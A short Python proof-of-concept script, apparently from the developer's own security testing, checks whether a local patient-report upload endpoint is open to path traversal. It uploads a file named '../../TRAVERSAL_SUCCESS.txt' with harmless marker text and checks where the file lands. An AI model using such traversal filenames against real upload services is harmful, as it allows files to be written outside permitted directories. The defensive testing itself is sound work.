import httpx
import asyncio
import os

API_BASE = "http://localhost:8000/api/v1"

async def test_path_traversal():
    print("\n--- Testing Path Traversal (OWASP A01) ---")
    url = f"{API_BASE}/patient/upload-report"
    
    # We need a valid token to reach the logic, or we see if the server crashes/errors early
    # For PoC, let's assume we are logged in or just test the logic if it was public
    
    # Attempt to write to the base 'uploads' directory or even 'app' directory
    malicious_filename = "../../TRAVERSAL_SUCCESS.txt"
    content = b"This file was created via Path Traversal vulnerability."
    
    files = {'file': (malicious_filename, content, 'text/plain')}
    
    async with httpx.AsyncClient() as client:
        try:
            # We don't have a token in this script, but look at the server logs to see if it ATTEMPTED to write
            response = await client.post(url, files=files)
            print(f"Response Status: {response.status_code}")
            
            # Check if the file exists in the parent directory
            # Based on file_path = f"uploads/reports/{file_id}_{file.filename}"
            # Target would be: uploads/reports/<uuid>_../../TRAVERSAL_SUCCESS.txt -> uploads/TRAVERSAL_SUCCESS.txt
            if os.path.exists("uploads/TRAVERSAL_SUCCESS.txt"):
                print("[CRITICAL] Path Traversal SUCCEEDED! Created uploads/TRAVERSAL_SUCCESS.txt")
            else:
                print("[INFO] Path Traversal did not create file in 'uploads/'. Checking logs...")
        except Exception as e:
            print(f"Request failed: {e}")

if __name__ == "__main__":
    if not os.path.exists("uploads"):
        os.makedirs("uploads")
    asyncio.run(test_path_traversal())
